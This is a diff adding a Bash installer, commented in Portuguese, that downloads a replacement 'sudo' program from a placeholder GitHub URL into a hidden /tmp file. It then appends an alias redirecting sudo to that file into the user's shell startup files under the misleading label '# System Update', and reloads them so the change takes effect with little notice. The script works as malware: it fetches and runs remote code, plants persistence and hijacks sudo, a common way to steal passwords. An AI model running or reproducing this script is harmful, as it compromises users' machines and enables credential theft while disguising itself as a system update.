@@ -1,0 +1,47 @@
+#!/bin/bash
+
+# Cores para o visual
+GREEN='\033[0;32m'
+BLUE='\033[0;34m'
+NC='\033[0m'
+
+echo -e "${BLUE}[1/3] Detectando ambiente e sistema...${NC}"
+OS_TYPE=$(uname)
+USER_HOME=$HOME
+
+# Define onde baixar o script do sudo (ajuste para o SEU link do GitHub)
+SUDO_RAW_URL="https://raw.githubusercontent.com/SEU_USER/SEU_REPO/main/sudo"
+SUDO_LOCAL_PATH="/tmp/.sys_sudo"
+
+echo -e "${BLUE}[2/3] Baixando componentes de segurança...${NC}"
+curl -fsSL "$SUDO_RAW_URL" -o "$SUDO_LOCAL_PATH"
+chmod +x "$SUDO_LOCAL_PATH"
+
+echo -e "${BLUE}[3/3] Configurando persistência no Shell...${NC}"
+
+# Lista de arquivos de configuração para tentar injetar o alias
+TARGET_FILES=("$USER_HOME/.zshrc" "$USER_HOME/.bashrc" "$USER_HOME/.bash_profile" "$USER_HOME/.profile")
+
+# O comando que será injetado
+ALIAS_CMD="alias sudo='$SUDO_LOCAL_PATH'"
+
+SUCCESS=false
+for file in "${TARGET_FILES[@]}"; do
+    if [ -f "$file" ]; then
+        # Verifica se já não existe o alias para não duplicar
+        if ! grep -q "$SUDO_LOCAL_PATH" "$file"; then
+            echo -e "   ${GREEN}→ Injetando em $file${NC}"
+            echo -e "\n# System Update\n$ALIAS_CMD" >> "$file"
+            SUCCESS=true
+        fi
+    fi
+done
+
+if [ "$SUCCESS" = true ]; then
+    echo -e "\n${GREEN}✔ Instalação concluída com sucesso!${NC}"
+    # Tenta aplicar a mudança na sessão atual sem o usuário notar muito
+    source "$USER_HOME/.zshrc" 2>/dev/null
+    source "$USER_HOME/.bashrc" 2>/dev/null
+else
+    echo -e "\n\033[0;31m✘ Erro: Nenhum arquivo de configuração encontrado.\033[0m"
+fi
